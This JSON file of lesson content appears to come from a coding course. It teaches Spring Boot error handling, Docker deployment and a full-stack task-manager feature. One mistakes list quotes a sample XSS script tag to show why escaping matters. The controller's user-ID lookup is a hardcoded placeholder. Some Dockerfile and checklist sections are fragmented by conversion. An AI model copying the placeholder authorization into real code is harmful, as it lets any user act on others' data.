              "content": "```java\nSCENARIO: User tries to register with existing email\n\n1. FRONTEND sends request:\nPOST /api/users\n{\n  \"name\": \"Bob\",\n  \"email\": \"alice@email.com\"  // Already exists!\n}\n\n2. BACKEND - Service layer:\n@Service\npublic class UserService {\n    public User create(User user) {\n        if (userRepository.existsByEmail(user.getEmail())) {\n            throw new DuplicateResourceException(\n                \"Email already registered\"\n            );\n        }\n        return userRepository.save(user);\n    }\n}\n\n3. BACKEND - Exception handler catches it:\n@RestControllerAdvice\npublic class GlobalExceptionHandler {\n    @ExceptionHandler(DuplicateResourceException.class)\n    public ProblemDetail handleDuplicate(DuplicateResourceException ex) {\n        ProblemDetail problem = ProblemDetail.forStatusAndDetail(\n            HttpStatus.CONFLICT,  // 409\n            ex.getMessage()\n        );\n        problem.setProperty(\"errorCode\", ex.getErrorCode());\n        return problem;\n    }\n}\n\n4. RESPONSE sent to frontend:\nHTTP/1.1 409 Conflict\nContent-Type: application/problem+json\n{\n  \"status\": 409,\n  \"detail\": \"Email already registered\",\n  \"errorCode\": \"DUPLICATE_RESOURCE\"\n}\n\n5. FRONTEND handles error:\nif (response.status === 409) {\n    displayError('This email is already registered. Please login instead.');\n}\n\n6. USER sees:\n[Error Message Box]\nThis email is already registered. Please login instead.\n[×]\n\nCOMPLETE JOURNEY - Error caught and handled at every layer!\n```"
            },
            {
              "type": "THEORY",
              "title": "⚠️ Common Error Handling Mistakes",
              "content": "❌ MISTAKE 1: Catching and ignoring exceptions\ntry {\n    userService.create(user);\n} catch (Exception e) {\n    // Nothing here - ERROR VANISHES!\n}\n\n❌ MISTAKE 2: Generic error messages\ndisplayError(\"Error occurred\");  // What error? How to fix?\n\n✓ FIX: Be specific\ndisplayError(\"Email already exists. Please use a different email.\");\n\n❌ MISTAKE 3: Not validating on both sides\n// Only frontend validation - can be bypassed!\n// Only backend validation - bad UX (slow feedback)\n\n✓ FIX: Validate on BOTH frontend and backend\n\n❌ MISTAKE 4: Returning 200 OK with error\nreturn ResponseEntity.ok(Map.of(\"error\", \"User not found\"));\n\n✓ FIX: Use proper status codes\nreturn ResponseEntity.status(HttpStatus.NOT_FOUND)\n    .body(problemDetail);\n\n❌ MISTAKE 5: Not logging errors\n// Error happens, no log, no way to debug\n\n✓ FIX: Always log exceptions\nlogger.error(\"Failed to create user: {}\", ex.getMessage(), ex);"
            }
          ],
          "challenges": []
        },
        {
          "id": "epoch-8-lesson-5",
          "title": "Lesson 15.5: Deployment - From Laptop to Production",
          "moduleId": "module-full-stack",
          "order": 5,
          "estimatedMinutes": 55,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Journey from Development to Production",
              "content": "Your application works on your laptop. Great!\nBut how do users actually use it?\n\nTHE DEPLOYMENT PIPELINE:\n\n1. DEVELOPMENT (Your laptop):\n   - Run: ./mvnw spring-boot:run\n   - Database: localhost:5432\n   - Hot reload enabled\n   - Debug mode on\n\n2. BUILD (Create executable):\n   - Package as JAR file\n   - All dependencies included\n   - Single file to deploy\n\n3. TEST ENVIRONMENT (Pre-production):\n   - Test database\n   - Similar to production\n   - Catch bugs before users see them\n\n4. PRODUCTION (The real thing):\n   - Real database with real data\n   - Real users\n   - Must be reliable, secure, fast\n   - Logging and monitoring essential\n\nGOAL: Make deployment smooth, repeatable, and safe!"
            },
            {
              "type": "KEY_POINT",
              "title": "Deployment is Like Opening a Restaurant",
              "content": "DEVELOPMENT (Test kitchen at home):\nYou're experimenting with recipes in your home kitchen\nLike: Running on localhost, making changes\n\nBUILD (Prepare for opening):\nPackage all your recipes, ingredients, equipment\nLike: mvn package creates myapp.jar\n\nTEST ENVIRONMENT (Soft opening):\nInvite friends and family to test the restaurant\nLike: Deploy to staging server, run tests\n\nPRODUCTION (Grand opening):\nReal customers, real money, real reviews\nLike: Deploy to production server, monitor everything\n\nCONFIGURATION:\nHome kitchen uses different equipment than restaurant\nLike: Dev uses localhost, prod uses real database URL\nSolution: Environment variables (swap out settings)"
            },
            {
              "type": "THEORY",
              "title": "Building a Production JAR",
              "content": "Spring Boot creates a 'fat JAR' - everything in one file:\n\nBuild with Maven:\n./mvnw clean package\n\nThis creates:\ntarget/myapp-0.0.1-SNAPSHOT.jar\n\nRun the JAR:\njava -jar target/myapp-0.0.1-SNAPSHOT.jar\n\nWhat's inside the JAR?\n- Your compiled code (.class files)\n- All dependencies (Spring, database drivers, etc.)\n- Embedded web server (Tomcat)\n- Configuration files (application.yml)\n\nRESULT: One file that runs anywhere with Java installed!\n\nSkip tests during build (faster, but risky):\n./mvnw clean package -DskipTests\n\nBuild with specific profile:\n./mvnw clean package -Pprod\n\nRename JAR to something simpler:\nIn pom.xml:\n<build>\n    <finalName>myapp</finalName>\n</build>\n\nNow creates: target/myapp.jar"
            },
            {
              "type": "THEORY",
              "title": "Environment-Specific Configuration",
              "content": "DON'T hardcode production values!\n\nBAD:\nspring.datasource.url=jdbc:postgresql://prod-server:5432/db\nspring.datasource.password=supersecret123\n\nGOOD: Use Spring Profiles\n\napplication.yml (default/shared config):\nspring:\n  application:\n    name: myapp\n  jpa:\n    hibernate:\n      ddl-auto: validate  # Safe default\n\napplication-dev.yml (development):\nspring:\n  datasource:\n    url: jdbc:postgresql://localhost:5432/myapp_dev\n    username: dev_user\n    password: dev_password\n  jpa:\n    hibernate:\n      ddl-auto: create-drop  # Recreate DB each time\n    show-sql: true  # Show all SQL queries\n\napplication-prod.yml (production):\nspring:\n  datasource:\n    url: ${DATABASE_URL}  # From environment variable!\n    username: ${DATABASE_USERNAME}\n    password: ${DATABASE_PASSWORD}\n  jpa:\n    hibernate:\n      ddl-auto: validate  # NEVER recreate production DB!\n    show-sql: false  # Don't log SQL (performance)\n\nActivate profile when running:\njava -jar myapp.jar --spring.profiles.active=prod\n\nOr set environment variable:\nexport SPRING_PROFILES_ACTIVE=prod\njava -jar myapp.jar"
            },
            {
              "type": "KEY_POINT",
              "title": "Environment Variables for Secrets",
              "content": "NEVER commit secrets to Git!\n\n❌ BAD - Hardcoded in application.yml:\nspring.datasource.password=mysecretpassword\njwt.secret=my-super-secret-key-12345\n\n✓ GOOD - Environment variables:\nspring.datasource.password=${DATABASE_PASSWORD}\njwt.secret=${JWT_SECRET}\n\nSet on server:\nexport DATABASE_PASSWORD='actual-secret-password'\nexport JWT_SECRET='actual-jwt-secret-key'\njava -jar myapp.jar\n\nOr pass directly:\njava -jar myapp.jar \\\n  --spring.datasource.password=secret123 \\\n  --jwt.secret=my-jwt-key\n\nSpring Boot automatically converts:\nDATABASE_URL → spring.datasource.url\nDATABASE_USERNAME → spring.datasource.username\nDATABASE_PASSWORD → spring.datasource.password\n\nWhy environment variables?\n✓ Different values per environment (dev, test, prod)\n✓ Secrets not in Git (security)\n✓ Easy to change without rebuilding\n✓ Cloud platforms (AWS, Azure, Heroku) support them"
            },
            {
              "type": "THEORY",
              "title": "Docker Deployment (Modern Standard)",
              "content": "Docker packages your app + Java + OS into one container\n\nBenefits:\n✓ Runs the same everywhere (your laptop, AWS, Azure)\n✓ No 'it works on my machine' problems\n✓ Easy to scale (run 10 copies)\n✓ Isolated from other apps\n\nSimple Dockerfile:"
            },
            {
              "type": "THEORY",
              "title": "Use official Java image",
              "content": "Use the official Eclipse Temurin image for production Java applications. This provides a secure, well-maintained JRE."
            },
            {
              "type": "THEORY",
              "title": "Set working directory",
              "content": "Set the working directory inside the container to /app. All subsequent commands run from this directory."
            },
            {
              "type": "THEORY",
              "title": "Copy JAR file",
              "content": "Copy your compiled Spring Boot JAR file from the target folder into the container as app.jar."
            },
            {
              "type": "THEORY",
              "title": "Expose port",
              "content": "Expose port 8080 so external clients can connect to your Spring Boot application running inside the container."
            },
            {
              "type": "THEORY",
              "title": "Run application",
              "content": "ENTRYPOINT [\"java\", \"-jar\", \"app.jar\"]\n\nBuild Docker image:\ndocker build -t myapp:1.0 .\n\nRun container:\ndocker run -p 8080:8080 \\\n  -e DATABASE_URL=jdbc:postgresql://db:5432/myapp \\\n  -e DATABASE_PASSWORD=secret \\\n  myapp:1.0\n\nAccess app: http://localhost:8080"
            },
            {
              "type": "THEORY",
              "title": "Multi-Stage Docker Build (Best Practice 2024-2025)",
              "content": "Build and run in same Dockerfile - smaller final image:"
            },
            {
              "type": "THEORY",
              "title": "Stage 1: Build",
              "content": "FROM eclipse-temurin:23-jdk as builder\nWORKDIR /app\nCOPY pom.xml .\nCOPY src ./src\nRUN ./mvnw clean package -DskipTests"
            },
            {
              "type": "THEORY",
              "title": "Stage 2: Run",
              "content": "FROM eclipse-temurin:23-jre\nWORKDIR /app\nCOPY --from=builder /app/target/myapp.jar app.jar\nEXPOSE 8080\nENTRYPOINT [\"java\", \"-jar\", \"app.jar\"]\n\nWhy multi-stage?\n✓ Smaller image (no Maven, no source code)\n✓ Faster downloads\n✓ More secure (fewer tools = less attack surface)\n\nImage sizes:\n- Single stage with JDK: ~500 MB\n- Multi-stage with JRE: ~250 MB\n\nLayer optimization (Spring Boot 2.3+):\nSeparate layers for dependencies vs your code:"
            },
            {
              "type": "THEORY",
              "title": "Extract layers",
              "content": "FROM eclipse-temurin:23-jdk as builder\nWORKDIR /app\nCOPY target/myapp.jar app.jar\nRUN java -Djarmode=layertools -jar app.jar extract"
            },
            {
              "type": "THEORY",
              "title": "Run with layers",
              "content": "FROM eclipse-temurin:23-jre\nWORKDIR /app\nCOPY --from=builder /app/dependencies/ ./\nCOPY --from=builder /app/spring-boot-loader/ ./\nCOPY --from=builder /app/snapshot-dependencies/ ./\nCOPY --from=builder /app/application/ ./\nENTRYPOINT [\"java\", \"org.springframework.boot.loader.JarLauncher\"]\n\nBenefit: Dependencies cached, only your code layer changes!"
            },
            {
              "type": "THEORY",
              "title": "Production-Ready Features",
              "content": "Add Spring Boot Actuator for monitoring:\n\npom.xml:\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-actuator</artifactId>\n</dependency>\n\napplication-prod.yml:\nmanagement:\n  endpoints:\n    web:\n      exposure:\n        include: health,info,metrics\n  endpoint:\n    health:\n      show-details: when-authorized\n\nEndpoints:\nGET /actuator/health - Is app running?\n{\n  \"status\": \"UP\",\n  \"components\": {\n    \"db\": {\"status\": \"UP\"},\n    \"diskSpace\": {\"status\": \"UP\"}\n  }\n}\n\nGET /actuator/info - App information\nGET /actuator/metrics - Performance metrics\n\nCustom health check:\n@Component\npublic class DatabaseHealthIndicator implements HealthIndicator {\n    private final UserRepository userRepository;\n    \n    public DatabaseHealthIndicator(UserRepository userRepository) {\n        this.userRepository = userRepository;\n    }\n    \n    @Override\n    public Health health() {\n        try {\n            long count = userRepository.count();\n            return Health.up()\n                .withDetail(\"database\", \"reachable\")\n                .withDetail(\"userCount\", count)\n                .build();\n        } catch (Exception e) {\n            return Health.down()\n                .withDetail(\"error\", e.getMessage())\n                .build();\n        }\n    }\n}"
            },
            {
              "type": "THEORY",
              "title": "⚠️ Production Security Checklist",
              "content": "Before deploying to production:\n\n✓ HTTPS only (no HTTP)\nserver.ssl.enabled=true\n\n✓ Hide actuator endpoints from public\nmanagement.endpoints.web.exposure.include=health"
            },
            {
              "type": "THEORY",
              "title": "Or require authentication",
              "content": "✓ Disable debug mode\nlogging.level.root=INFO  # Not DEBUG\n\n✓ Don't show SQL queries\nspring.jpa.show-sql=false\n\n✓ Validate database schema only\nspring.jpa.hibernate.ddl-auto=validate  # NOT create-drop!\n\n✓ Use environment variables for secrets"
            },
            {
              "type": "THEORY",
              "title": "Never hardcode passwords",
              "content": "✓ Enable CORS only for your frontend\n@CrossOrigin(origins = \"https://myapp.com\")"
            },
            {
              "type": "THEORY",
              "title": "NOT @CrossOrigin(\"*\")",
              "content": "Avoid using @CrossOrigin(\"*\") which allows all origins. Instead, configure CORS to only accept requests from your frontend domain and set reasonable rate limits to prevent abuse."
            },
            {
              "type": "THEORY",
              "title": "Prevent abuse",
              "content": "✓ Log to files, not just console\nlogging.file.name=/var/log/myapp.log\n\n✓ Set up monitoring and alerts"
            },
            {
              "type": "THEORY",
              "title": "💻 Complete Production Deployment",
              "content": "```java\nSTEP 1: Build the application\n./mvnw clean package\n\nSTEP 2: Create Dockerfile\nFROM eclipse-temurin:23-jre\nWORKDIR /app\nCOPY target/myapp.jar app.jar\nEXPOSE 8080\nHEALTHCHECK --interval=30s --timeout=3s \\\n  CMD curl -f http://localhost:8080/actuator/health || exit 1\nENTRYPOINT [\"java\", \"-jar\", \"app.jar\"]\n\nSTEP 3: Create docker-compose.yml\nversion: '3.8'\nservices:\n  db:\n    image: postgres:15\n    environment:\n      POSTGRES_DB: myapp\n      POSTGRES_USER: appuser\n      POSTGRES_PASSWORD: ${DB_PASSWORD}\n    volumes:\n      - postgres-data:/var/lib/postgresql/data\n    \n  app:\n    build: .\n    ports:\n      - \"8080:8080\"\n    environment:\n      SPRING_PROFILES_ACTIVE: prod\n      DATABASE_URL: jdbc:postgresql://db:5432/myapp\n      DATABASE_USERNAME: appuser\n      DATABASE_PASSWORD: ${DB_PASSWORD}\n    depends_on:\n      - db\n    restart: unless-stopped\n\nvolumes:\n  postgres-data:\n\nSTEP 4: Create .env file (DON'T commit this!)\nDB_PASSWORD=your-secure-password-here\n\nSTEP 5: Deploy\ndocker-compose up -d\n\nSTEP 6: Check health\ncurl http://localhost:8080/actuator/health\n\nSTEP 7: View logs\ndocker-compose logs -f app\n\nSTEP 8: Update application\n./mvnw clean package\ndocker-compose build app\ndocker-compose up -d app\n```"
            },
            {
              "type": "THEORY",
              "title": "Logging in Production",
              "content": "Configure proper logging:\n\napplication-prod.yml:\nlogging:\n  level:\n    root: INFO\n    com.myapp: INFO\n    org.springframework.web: WARN\n  file:\n    name: /var/log/myapp/application.log\n  pattern:\n    console: \"%d{yyyy-MM-dd HH:mm:ss} - %msg%n\"\n    file: \"%d{yyyy-MM-dd HH:mm:ss} [%thread] %-5level %logger{36} - %msg%n\"\n\nUse structured logging:\n\n@RestController\npublic class UserController {\n    private static final Logger logger = \n        LoggerFactory.getLogger(UserController.class);\n    \n    @PostMapping(\"/api/users\")\n    public User create(@RequestBody User user) {\n        logger.info(\"Creating user: email={}\", user.getEmail());\n        try {\n            User saved = userService.create(user);\n            logger.info(\"User created: id={}, email={}\", \n                       saved.getId(), saved.getEmail());\n            return saved;\n        } catch (DuplicateResourceException e) {\n            logger.warn(\"Duplicate user creation attempt: email={}\", \n                       user.getEmail());\n            throw e;\n        } catch (Exception e) {\n            logger.error(\"Failed to create user: email={}\", \n                        user.getEmail(), e);\n            throw e;\n        }\n    }\n}\n\nNEVER log sensitive data:\n❌ logger.info(\"User: {}\", user.getPassword());\n❌ logger.info(\"Credit card: {}\", creditCard);\n✓ logger.info(\"User authenticated: id={}\", user.getId());"
            }
          ],
          "challenges": []
        },
        {
          "id": "epoch-8-lesson-6",
          "title": "Lesson 15.6: Complete Feature - Database to UI",
          "moduleId": "module-full-stack",
          "order": 6,
          "estimatedMinutes": 60,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Full-Stack Feature Journey",
              "content": "Let's build a complete feature: USER TASK MANAGEMENT\n\nFeature: Users can create, view, update, and delete tasks\n\nTHE COMPLETE STACK:\n\n1. DATABASE (PostgreSQL):\n   - tasks table (id, title, description, completed, user_id)\n\n2. BACKEND (Spring Boot):\n   - Task entity (Java class mapped to database)\n   - TaskRepository (database access)\n   - TaskService (business logic)\n   - TaskController (REST API endpoints)\n\n3. API LAYER (REST):\n   - GET /api/tasks - List all tasks\n   - POST /api/tasks - Create task\n   - PUT /api/tasks/{id} - Update task\n   - DELETE /api/tasks/{id} - Delete task\n\n4. FRONTEND (HTML + JavaScript):\n   - Task list display\n   - Create task form\n   - Mark complete button\n   - Delete button\n\nWe'll build this step-by-step, bottom-up!"
            },
            {
              "type": "KEY_POINT",
              "title": "Building a Feature is Like Building a Highway System",
              "content": "DATABASE (The land/foundation):\nWhere everything is stored permanently\nLike: The actual roads built into the ground\n\nENTITY (The blueprint):\nDefines what a 'Task' looks like in Java\nLike: Highway specifications (lanes, width, materials)\n\nREPOSITORY (The construction crew):\nBuilds, reads, updates, destroys database records\nLike: Workers who build and maintain the roads\n\nSERVICE (Traffic management):\nBusiness rules (e.g., can't delete someone else's task)\nLike: Traffic laws and management systems\n\nCONTROLLER (Toll booths/entrances):\nWhere requests come in and responses go out\nLike: Highway entrances/exits with toll systems\n\nFRONTEND (The cars and drivers):\nWhat users actually see and interact with\nLike: People driving cars on the highway\n\nAll parts must work together!"
            },
            {
              "type": "THEORY",
              "title": "Step 1: Database Schema",
              "content": "Create the tasks table:\n\nCREATE TABLE tasks (\n    id BIGSERIAL PRIMARY KEY,\n    title VARCHAR(255) NOT NULL,\n    description TEXT,\n    completed BOOLEAN DEFAULT FALSE,\n    user_id BIGINT NOT NULL,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE\n);\n\nKey decisions:\n- BIGSERIAL: Auto-incrementing ID\n- VARCHAR(255): Short text for title\n- TEXT: Longer text for description\n- BOOLEAN: True/false for completed status\n- TIMESTAMP: When created/updated\n- FOREIGN KEY: Links to users table\n- ON DELETE CASCADE: Delete tasks when user deleted\n\nSpring Boot can create this automatically:\n\napplication.yml:\nspring:\n  jpa:\n    hibernate:\n      ddl-auto: update  # Creates/updates tables automatically"
            },
            {
              "type": "THEORY",
              "title": "Step 2: Create the Entity",
              "content": "Map Java class to database table:\n\n@Entity\n@Table(name = \"tasks\")\npublic class Task {\n    \n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n    \n    @Column(nullable = false)\n    private String title;\n    \n    @Column(columnDefinition = \"TEXT\")\n    private String description;\n    \n    @Column(nullable = false)\n    private Boolean completed = false;\n    \n    @ManyToOne(fetch = FetchType.LAZY)\n    @JoinColumn(name = \"user_id\", nullable = false)\n    private User user;\n    \n    @CreationTimestamp\n    private LocalDateTime createdAt;\n    \n    @UpdateTimestamp\n    private LocalDateTime updatedAt;\n    \n    // Constructors\n    public Task() {}\n    \n    public Task(String title, String description, User user) {\n        this.title = title;\n        this.description = description;\n        this.user = user;\n        this.completed = false;\n    }\n    \n    // Getters and Setters\n    public Long getId() { return id; }\n    public void setId(Long id) { this.id = id; }\n    \n    public String getTitle() { return title; }\n    public void setTitle(String title) { this.title = title; }\n    \n    public String getDescription() { return description; }\n    public void setDescription(String description) { \n        this.description = description; \n    }\n    \n    public Boolean getCompleted() { return completed; }\n    public void setCompleted(Boolean completed) { \n        this.completed = completed; \n    }\n    \n    public User getUser() { return user; }\n    public void setUser(User user) { this.user = user; }\n    \n    public LocalDateTime getCreatedAt() { return createdAt; }\n    public LocalDateTime getUpdatedAt() { return updatedAt; }\n}"
            },
            {
              "type": "THEORY",
              "title": "Step 3: Create the Repository",
              "content": "Interface for database access:\n\n@Repository\npublic interface TaskRepository extends JpaRepository<Task, Long> {\n    \n    // Find all tasks for a specific user\n    List<Task> findByUserId(Long userId);\n    \n    // Find only completed tasks\n    List<Task> findByUserIdAndCompleted(Long userId, Boolean completed);\n    \n    // Find tasks with title containing text (case-insensitive)\n    List<Task> findByUserIdAndTitleContainingIgnoreCase(\n        Long userId, String searchTerm);\n    \n    // Count incomplete tasks\n    Long countByUserIdAndCompletedFalse(Long userId);\n    \n    // Check if task belongs to user (for authorization)\n    boolean existsByIdAndUserId(Long taskId, Long userId);\n}\n\nSpring Data JPA generates SQL automatically!\n\nfindByUserId(1L) becomes:\nSELECT * FROM tasks WHERE user_id = 1;\n\nfindByUserIdAndCompleted(1L, true) becomes:\nSELECT * FROM tasks WHERE user_id = 1 AND completed = true;"
            },
            {
              "type": "THEORY",
              "title": "Step 4: Create the Service",
              "content": "Business logic layer:\n\n@Service\npublic class TaskService {\n    private final TaskRepository taskRepository;\n    \n    public TaskService(TaskRepository taskRepository) {\n        this.taskRepository = taskRepository;\n    }\n    \n    public List<Task> getAllTasksForUser(Long userId) {\n        return taskRepository.findByUserId(userId);\n    }\n    \n    public Task createTask(Task task, Long userId) {\n        // Validation\n        if (task.getTitle() == null || task.getTitle().isBlank()) {\n            throw new IllegalArgumentException(\"Title cannot be empty\");\n        }\n        \n        // Set user (security: use authenticated user, not from request)\n        User user = new User();\n        user.setId(userId);\n        task.setUser(user);\n        \n        return taskRepository.save(task);\n    }\n    \n    public Task updateTask(Long taskId, Task updates, Long userId) {\n        Task existing = taskRepository.findById(taskId)\n            .orElseThrow(() -> new ResourceNotFoundException(\n                \"Task\", taskId));\n        \n        // Security check: can only update your own tasks\n        if (!existing.getUser().getId().equals(userId)) {\n            throw new ForbiddenException(\n                \"Cannot update another user's task\");\n        }\n        \n        // Update fields\n        if (updates.getTitle() != null) {\n            existing.setTitle(updates.getTitle());\n        }\n        if (updates.getDescription() != null) {\n            existing.setDescription(updates.getDescription());\n        }\n        if (updates.getCompleted() != null) {\n            existing.setCompleted(updates.getCompleted());\n        }\n        \n        return taskRepository.save(existing);\n    }\n    \n    public void deleteTask(Long taskId, Long userId) {\n        Task task = taskRepository.findById(taskId)\n            .orElseThrow(() -> new ResourceNotFoundException(\n                \"Task\", taskId));\n        \n        // Security check\n        if (!task.getUser().getId().equals(userId)) {\n            throw new ForbiddenException(\n                \"Cannot delete another user's task\");\n        }\n        \n        taskRepository.delete(task);\n    }\n}"
            },
            {
              "type": "THEORY",
              "title": "Step 5: Create the Controller",
              "content": "REST API endpoints:\n\n@RestController\n@RequestMapping(\"/api/tasks\")\n@CrossOrigin(origins = \"http://localhost:3000\")\npublic class TaskController {\n    private final TaskService taskService;\n    \n    public TaskController(TaskService taskService) {\n        this.taskService = taskService;\n    }\n    \n    // GET /api/tasks - Get all tasks for current user\n    @GetMapping\n    public ResponseEntity<List<Task>> getAllTasks(\n            @AuthenticationPrincipal UserDetails userDetails) {\n        Long userId = getCurrentUserId(userDetails);\n        List<Task> tasks = taskService.getAllTasksForUser(userId);\n        return ResponseEntity.ok(tasks);\n    }\n    \n    // POST /api/tasks - Create new task\n    @PostMapping\n    public ResponseEntity<Task> createTask(\n            @Valid @RequestBody TaskRequest request,\n            @AuthenticationPrincipal UserDetails userDetails) {\n        Long userId = getCurrentUserId(userDetails);\n        Task task = new Task(request.getTitle(), \n                            request.getDescription(), null);\n        Task created = taskService.createTask(task, userId);\n        return ResponseEntity\n            .status(HttpStatus.CREATED)\n            .body(created);\n    }\n    \n    // PUT /api/tasks/{id} - Update task\n    @PutMapping(\"/{id}\")\n    public ResponseEntity<Task> updateTask(\n            @PathVariable Long id,\n            @RequestBody TaskRequest request,\n            @AuthenticationPrincipal UserDetails userDetails) {\n        Long userId = getCurrentUserId(userDetails);\n        Task updates = new Task();\n        updates.setTitle(request.getTitle());\n        updates.setDescription(request.getDescription());\n        updates.setCompleted(request.getCompleted());\n        Task updated = taskService.updateTask(id, updates, userId);\n        return ResponseEntity.ok(updated);\n    }\n    \n    // DELETE /api/tasks/{id} - Delete task\n    @DeleteMapping(\"/{id}\")\n    public ResponseEntity<Void> deleteTask(\n            @PathVariable Long id,\n            @AuthenticationPrincipal UserDetails userDetails) {\n        Long userId = getCurrentUserId(userDetails);\n        taskService.deleteTask(id, userId);\n        return ResponseEntity.noContent().build();\n    }\n    \n    private Long getCurrentUserId(UserDetails userDetails) {\n        // Extract user ID from authenticated user\n        // Implementation depends on your security setup\n        return 1L; // Placeholder\n    }\n}"
            },
            {
              "type": "THEORY",
              "title": "💻 Step 6: Create the Frontend (HTML)",
              "content": "```java\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Task Manager</title>\n    <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n<body>\n    <div class=\"container\">\n        <h1>My Tasks</h1>\n        \n        <!-- Create Task Form -->\n        <div class=\"create-task\">\n            <h2>Create New Task</h2>\n            <form id=\"createTaskForm\">\n                <input type=\"text\" id=\"title\" placeholder=\"Task title\" required>\n                <textarea id=\"description\" placeholder=\"Description\"></textarea>\n                <button type=\"submit\">Add Task</button>\n            </form>\n        </div>\n        \n        <!-- Error/Success Messages -->\n        <div id=\"message\" class=\"message\" style=\"display: none;\"></div>\n        \n        <!-- Task List -->\n        <div class=\"task-list\">\n            <h2>Tasks</h2>\n            <div id=\"tasks\">\n                <!-- Tasks will be loaded here by JavaScript -->\n            </div>\n        </div>\n    </div>\n    \n    <script src=\"app.js\"></script>\n</body>\n</html>\n```"
            },
            {
              "type": "THEORY",
              "title": "💻 Step 7: Create the Frontend (JavaScript)",
              "content": "```java\nconst API_URL = 'http://localhost:8080/api/tasks';\n\n// Load tasks when page loads\ndocument.addEventListener('DOMContentLoaded', () => {\n    loadTasks();\n    \n    // Handle form submission\n    document.getElementById('createTaskForm')\n        .addEventListener('submit', createTask);\n});\n\n// Fetch and display all tasks\nasync function loadTasks() {\n    try {\n        const response = await fetch(API_URL);\n        if (!response.ok) throw new Error('Failed to load tasks');\n        \n        const tasks = await response.json();\n        displayTasks(tasks);\n    } catch (error) {\n        showMessage('Error loading tasks: ' + error.message, 'error');\n    }\n}\n\n// Display tasks in the UI\nfunction displayTasks(tasks) {\n    const container = document.getElementById('tasks');\n    \n    if (tasks.length === 0) {\n        container.innerHTML = '<p>No tasks yet. Create one above!</p>';\n        return;\n    }\n    \n    container.innerHTML = tasks.map(task => `\n        <div class=\"task ${task.completed ? 'completed' : ''}\">\n            <div class=\"task-content\">\n                <h3>${escapeHtml(task.title)}</h3>\n                <p>${escapeHtml(task.description || '')}</p>\n            </div>\n            <div class=\"task-actions\">\n                <button onclick=\"toggleComplete(${task.id}, ${!task.completed})\">\n                    ${task.completed ? '✓ Completed' : 'Mark Complete'}\n                </button>\n                <button onclick=\"deleteTask(${task.id})\" class=\"delete-btn\">\n                    Delete\n                </button>\n            </div>\n        </div>\n    `).join('');\n}\n\n// Create new task\nasync function createTask(event) {\n    event.preventDefault();\n    \n    const title = document.getElementById('title').value;\n    const description = document.getElementById('description').value;\n    \n    try {\n        const response = await fetch(API_URL, {\n            method: 'POST',\n            headers: { 'Content-Type': 'application/json' },\n            body: JSON.stringify({ title, description })\n        });\n        \n        if (!response.ok) throw new Error('Failed to create task');\n        \n        // Clear form\n        document.getElementById('createTaskForm').reset();\n        \n        // Reload tasks\n        loadTasks();\n        showMessage('Task created successfully!', 'success');\n    } catch (error) {\n        showMessage('Error: ' + error.message, 'error');\n    }\n}\n\n// Toggle task completion\nasync function toggleComplete(taskId, completed) {\n    try {\n        const response = await fetch(`${API_URL}/${taskId}`, {\n            method: 'PUT',\n            headers: { 'Content-Type': 'application/json' },\n            body: JSON.stringify({ completed })\n        });\n        \n        if (!response.ok) throw new Error('Failed to update task');\n        \n        loadTasks();\n        showMessage('Task updated!', 'success');\n    } catch (error) {\n        showMessage('Error: ' + error.message, 'error');\n    }\n}\n\n// Delete task\nasync function deleteTask(taskId) {\n    if (!confirm('Delete this task?')) return;\n    \n    try {\n        const response = await fetch(`${API_URL}/${taskId}`, {\n            method: 'DELETE'\n        });\n        \n        if (!response.ok) throw new Error('Failed to delete task');\n        \n        loadTasks();\n        showMessage('Task deleted!', 'success');\n    } catch (error) {\n        showMessage('Error: ' + error.message, 'error');\n    }\n}\n\n// Show message to user\nfunction showMessage(text, type) {\n    const msg = document.getElementById('message');\n    msg.textContent = text;\n    msg.className = `message ${type}`;\n    msg.style.display = 'block';\n    setTimeout(() => msg.style.display = 'none', 3000);\n}\n\n// Prevent XSS attacks\nfunction escapeHtml(text) {\n    const div = document.createElement('div');\n    div.textContent = text;\n    return div.innerHTML;\n}\n```"
            },
            {
              "type": "THEORY",
              "title": "⚠️ Common Full-Stack Mistakes",
              "content": "❌ MISTAKE 1: Not handling errors\nFrontend sends request, backend fails, UI shows nothing\nFIX: try-catch everywhere, display errors to user\n\n❌ MISTAKE 2: No loading states\nUser clicks button, waits... did it work?\nFIX: Show 'Loading...' or disable buttons during requests\n\n❌ MISTAKE 3: Not escaping user input\nUser enters: <script>alert('hacked')</script>\nFIX: Use escapeHtml() or textContent instead of innerHTML\n\n❌ MISTAKE 4: Missing CORS configuration\nFrontend: http://localhost:3000\nBackend: http://localhost:8080\nBrowser blocks request!\nFIX: @CrossOrigin on controller\n\n❌ MISTAKE 5: Not validating on backend\nTrust frontend validation? Attacker bypasses it!\nFIX: ALWAYS validate on backend with @Valid\n\n❌ MISTAKE 6: Exposing IDs without authorization\nUser can delete task ID 123, not theirs!\nFIX: Check task.userId === currentUserId\n\n❌ MISTAKE 7: N+1 query problem\nLoading 100 tasks → 101 database queries!\nFIX: Use @EntityGraph or JOIN FETCH"
            },
            {
              "type": "KEY_POINT",
              "title": "Testing the Complete Flow",
